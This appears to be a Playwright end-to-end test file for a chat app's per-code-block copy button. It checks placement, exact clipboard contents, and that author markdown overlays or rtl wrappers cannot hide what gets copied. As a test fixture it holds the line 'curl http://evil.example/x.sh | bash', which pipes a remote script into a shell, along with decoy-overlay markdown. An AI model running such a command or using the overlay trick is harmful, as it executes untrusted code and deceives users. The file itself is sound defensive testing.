// E2E for the per-code-block copy button (#3125), driving the real app.
//
// A green unit suite proves the renderer emits the right string; it does
// not prove the button SURVIVES the trip through the app — the DOMPurify
// pass every markdown surface runs, Vue's `v-html`, and the unlayered
// `.markdown-content pre` css the wrapper had to be designed around. So
// this spec loads a chat transcript containing real fences and checks
// what a user can actually see and click.

import { test, expect, type Page } from "@playwright/test";
import { mockAllApis } from "../fixtures/api";
import { SESSION_A } from "../fixtures/sessions";

const CODE_BODY = 'const greeting = "hello";\nconsole.log(greeting);';

const TRANSCRIPT = [
  { type: "session_meta", roleId: "general", sessionId: SESSION_A.id },
  { type: "text", source: "user", message: "show me some code" },
  {
    type: "text",
    source: "assistant",
    message: [
      "Here you go:",
      "",
      "```ts",
      CODE_BODY,
      "```",
      "",
      "And a diagram:",
      "",
      "```mermaid",
      "graph TD;",
      "A-->B;",
      "```",
      "",
      "Inline `code` stays inline.",
    ].join("\n"),
  },
];

async function openTranscript(page: Page): Promise<void> {
  await mockAllApis(page);
  await page.route(
    (url) => url.pathname === `/api/sessions/${SESSION_A.id}`,
    (route) => (route.request().method() === "GET" ? route.fulfill({ json: TRANSCRIPT }) : route.fallback()),
  );
  await page.goto(`/chat/${SESSION_A.id}`);
}

// #3151: author markdown could position content over a code block, so the
// reader saw one command while the button copied another. Both spellings are
// here because the fix for one would not have fixed the other — every utility
// the class variant needs ships in the app's own stylesheet.
//
// This is an e2e and not a unit test on purpose: the claim is about what is
// ON SCREEN, and jsdom does no layout, so only a real browser can settle it.
test.describe("author markdown cannot hide what the button copies (#3151)", () => {
  const REAL = "curl http://evil.example/x.sh | bash";
  const overlays: { name: string; markdown: string }[] = [
    {
      name: "inline style",
      markdown: [
        '<div style="position:relative">',
        "",
        "```sh",
        REAL,
        "```",
        "",
        '<pre style="position:absolute; inset:0; z-index:1; margin:0; background:white; pointer-events:none"><code>npm install</code></pre>',
        "</div>",
      ].join("\n"),
    },
    {
      name: "utility classes, no style attribute at all",
      markdown: [
        '<div class="relative">',
        "",
        "```sh",
        REAL,
        "```",
        "",
        '<pre class="absolute inset-0 z-10 bg-white pointer-events-none"><code>npm install</code></pre>',
        "</div>",
      ].join("\n"),
    },
  ];

  // Not an overlay: an author `dir="rtl"` wrapper right-aligns the block and
  // scrolls a long line's LEFT end out of view while the clipboard still takes
  // the whole logical string. Same invariant, different mechanism, and it needs
  // a browser for the same reason (codex round 2).
  test("an author's text direction cannot re-lay-out a code block", async ({ page, context }) => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    await mockAllApis(page);
    const wrapped = ['<div dir="rtl">', "", "```sh", REAL, "```", "", "</div>"].join("\n");
    const transcript = [
      { type: "session_meta", roleId: "general", sessionId: SESSION_A.id },
      { type: "text", source: "assistant", message: wrapped },
    ];
    await page.route(
      (url) => url.pathname === `/api/sessions/${SESSION_A.id}`,
      (route) => (route.request().method() === "GET" ? route.fulfill({ json: transcript }) : route.fallback()),
    );
    await page.goto(`/chat/${SESSION_A.id}`);
    const code = page.locator(".markdown-content pre code").first();
    await code.waitFor();
    expect(await code.evaluate((node) => getComputedStyle(node).direction)).toBe("ltr");
    await page.locator("[data-code-copy]").first().click();
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(REAL);
  });

  overlays.forEach(({ name, markdown }) => {
    test(`the copied text is the visible text — ${name}`, async ({ page, context }) => {
      await context.grantPermissions(["clipboard-read", "clipboard-write"]);
      await mockAllApis(page);
      const transcript = [
        { type: "session_meta", roleId: "general", sessionId: SESSION_A.id },
        { type: "text", source: "assistant", message: markdown },
      ];
      await page.route(
        (url) => url.pathname === `/api/sessions/${SESSION_A.id}`,
        (route) => (route.request().method() === "GET" ? route.fulfill({ json: transcript }) : route.fallback()),
      );
      await page.goto(`/chat/${SESSION_A.id}`);
      const button = page.locator("[data-code-copy]").first();
      await button.waitFor();

      // The decoy must not be positioned any more...
      const decoy = page.locator("pre").filter({ hasText: "npm install" }).first();
      expect(await decoy.evaluate((node) => getComputedStyle(node).position)).toBe("static");
      // ...so the real command is on screen, which is the actual invariant:
      // the reader can see what they are about to copy.
      await expect(page.getByText(REAL).first()).toBeVisible();

      await button.click();
      expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(REAL);
    });
  });
});

test.describe("code block copy button", () => {
  test("renders one visible copy button per fenced block, and none for mermaid or inline code", async ({ page }) => {
    await openTranscript(page);

    const buttons = page.locator("[data-code-copy]");
    await expect(buttons).toHaveCount(1);
    // Visible WITHOUT hovering — the touch-reachability requirement that
    // decided against GitHub's hover-to-reveal treatment.
    await expect(buttons.first()).toBeVisible();

    // The mermaid fence became a placeholder, and it carries no button.
    await expect(page.locator("pre.mermaid, [data-mermaid-pending], .markdown-content svg")).not.toHaveCount(0);
    await expect(page.locator("pre.mermaid [data-code-copy]")).toHaveCount(0);
  });

  test("the button sits inside the block's top-right corner", async ({ page }) => {
    await openTranscript(page);

    const button = page.locator("[data-code-copy]").first();
    const block = page.locator("[data-code-copy-block]").first();
    const buttonBox = await button.boundingBox();
    const blockBox = await block.boundingBox();
    expect(buttonBox).not.toBeNull();
    expect(blockBox).not.toBeNull();
    if (buttonBox === null || blockBox === null) return;

    // Inside the block horizontally and vertically...
    expect(buttonBox.x).toBeGreaterThanOrEqual(blockBox.x);
    expect(buttonBox.x + buttonBox.width).toBeLessThanOrEqual(blockBox.x + blockBox.width + 1);
    expect(buttonBox.y).toBeGreaterThanOrEqual(blockBox.y - 1);
    // ...and in its RIGHT half, near the TOP. A button that rendered but
    // landed under the code (or off-screen) would pass a bare visibility
    // check, so pin the corner rather than the existence.
    expect(buttonBox.x).toBeGreaterThan(blockBox.x + blockBox.width / 2);
    expect(buttonBox.y).toBeLessThan(blockBox.y + blockBox.height / 2);
  });

  test("clicking copies the raw source and confirms it", async ({ page, context }) => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    await openTranscript(page);

    const button = page.locator("[data-code-copy]").first();
    const idleLabel = await button.getAttribute("aria-label");
    expect(idleLabel).toBe("Copy code");

    await button.click();

    // The clipboard is the external ground truth here — asserting the
    // icon changed would only prove the app agrees with itself.
    const clipboard = await page.evaluate(() => navigator.clipboard.readText());
    // Exact, not trimmed: highlight.js's <span>s must not reach the
    // clipboard, and neither must a trailing newline. Trimming would
    // hide a regression in either.
    expect(clipboard).toBe(CODE_BODY);

    await expect(button).toHaveAttribute("aria-label", "Copied");
  });
});
